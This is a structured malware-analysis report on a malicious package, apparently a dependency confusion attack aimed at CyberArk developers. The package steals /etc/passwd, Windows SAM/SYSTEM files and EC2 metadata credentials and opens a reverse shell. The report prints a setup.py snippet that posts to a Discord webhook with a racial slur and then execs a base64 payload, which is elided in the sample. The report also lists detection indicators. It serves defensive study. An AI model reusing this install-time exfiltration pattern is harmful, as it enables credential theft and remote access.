package_info.why_malicious: The package is a dependency confusion attack targeting CyberARK developers, designed to exfiltrate highly sensitive files (Linux passwd, Windows SAM/SYSTEM, AWS EC2 credentials) to an external server. This goes far beyond proof-of-concept and constitutes active credential theft.

The package contains an encrypted payload in setup.py that exfiltrates data to a Discord webhook and attempts to open a reverse shell, giving attackers remote command execution on the victim's machine.

malicious_snippets.code_behavior: Reads the /etc/passwd file (Linux user account information), encodes it in base64.

malice_analysis.why_suspicious: Accessing /etc/passwd is unnecessary for normal package operation and is a common target for credential theft.
malice_analysis.violated_expectations: A legitimate package should not access or exfiltrate system credential files.
malice_analysis.similar_legitimate_use: System administration tools may read /etc/passwd, but not in a general-purpose npm package.

malicious_snippets.code_behavior: Reads the Windows SAM file (contains hashed user passwords), encodes it in base64.

malice_analysis.why_suspicious: Accessing the SAM file is a clear sign of credential theft.
malice_analysis.violated_expectations: No npm package should access Windows SAM file.

malicious_snippets.code_behavior: Reads the Windows SYSTEM file (contains system configuration and can be used with SAM for password cracking), encodes it in base64.

malice_analysis.why_suspicious: Accessing SYSTEM file is unnecessary and highly suspicious.
malice_analysis.violated_expectations: No npm package should access Windows SYSTEM file.

malicious_snippets.code_behavior: Attempts to access the AWS EC2 instance metadata service to steal cloud credentials.

malice_analysis.why_suspicious: Accessing the EC2 metadata service is a known cloud credential theft technique.
malice_analysis.violated_expectations: Normal packages should not access cloud instance metadata.

malicious_snippets.code_snippet:
import setuptools
try:
    import requests
    requests.post('https://discord.com/api/webhooks/9851628622475326/...', json={'content':'niger'})
    exec("""import base64 as b; exec(b.b64decode('...'))""")
except:
    pass
malicious_snippets.code_behavior: Sends a notification to a Discord webhook, then executes a large encrypted (base64) payload that exfiltrates data and opens a reverse shell.

malice_analysis.why_suspicious: Encrypted payloads in setup.py are a hallmark of malware. The code exfiltrates data and attempts to open a reverse shell.
malice_analysis.violated_expectations: setup.py should only handle package installation, not execute encrypted code or exfiltrate data.
malice_analysis.similar_legitimate_use: Encrypted payloads are never legitimate in setup.py.

attack_chain.action: Malicious package is installed or imported by the victim (dependency confusion or typo-squatting).
attack_chain.leads_to: Execution of malicious code in package entry points (index.js or setup.py).

attack_chain.action: Sensitive files and credentials are accessed and encoded (Linux /etc/passwd, Windows SAM/SYSTEM, AWS EC2 credentials).
Data is exfiltrated to attacker-controlled infrastructure (Discord webhook, external server).
attack_chain.leads_to: Attacker receives stolen credentials and system information.

attack_chain.action: Reverse shell is established, granting attacker remote command execution.
attack_chain.leads_to: Attacker gains persistent access to the victim system.

behavioral_signatures: Access to /etc/passwd, Windows SAM/SYSTEM files by npm/PyPI packages
Base64 encoding of sensitive file contents
file_indicators: index.js with credential theft logic in npm packages
References to /etc/passwd, SAM, SYSTEM, or 169.254.169.254 in package code
network_indicators: Any exfiltration to non-standard endpoints during install/import
detection_knowledge.how_to_detect: Monitor for package installation or import events that trigger access to sensitive files (e.g., /etc/passwd, Windows SAM/SYSTEM), network requests to cloud metadata endpoints (169.254.169.254), or outbound connections to Discord webhooks. Flag any setup.py or index.js containing base64-encoded exec statements or references to credential files. Use static analysis to detect suspicious file access and network patterns in package entry points.
